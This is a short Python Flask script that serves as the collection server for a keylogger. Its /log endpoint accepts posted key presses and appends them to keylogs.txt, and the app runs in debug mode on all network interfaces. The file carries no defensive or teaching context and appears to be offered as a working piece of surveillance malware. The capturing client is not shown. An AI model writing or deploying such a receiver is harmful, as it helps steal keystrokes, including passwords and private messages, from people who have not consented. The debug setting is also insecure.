from flask import Flask, request

app = Flask(__name__)

# Route to receive and log the key presses
@app.route('/log', methods=['POST'])
def log_data():
    key_logged = request.form.get('key')
    if key_logged:
        try:
            with open('keylogs.txt', 'a') as f:
                f.write(key_logged + '\n')
            return 'Key logged successfully!', 200
        except IOError as e:
            return f"Failed to write log: {e}", 500
    else:
        return 'No key logged.', 400

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)